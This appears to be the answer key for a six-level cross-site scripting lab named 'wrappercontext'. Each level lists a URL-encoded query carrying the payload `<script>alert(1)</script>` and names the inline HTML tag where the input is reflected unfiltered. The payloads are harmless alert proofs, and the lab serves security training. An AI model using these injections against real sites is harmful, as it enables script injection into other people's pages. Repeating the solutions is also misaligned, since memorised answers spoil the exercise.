# wrappercontext — solutions

Plain reflections wrapped in inline formatting tags; no filtering.

### wrappercontext-level1

`/wrappercontext/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw inside `<b><i>...`

### wrappercontext-level2

`/wrappercontext/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw inside styled `<span>`

### wrappercontext-level3

`/wrappercontext/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw inside `<a href="#">` link text

### wrappercontext-level4

`/wrappercontext/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw inside `<small><em>...`

### wrappercontext-level5

`/wrappercontext/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw inside `<mark>`

### wrappercontext-level6

`/wrappercontext/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw inside `<abbr>`
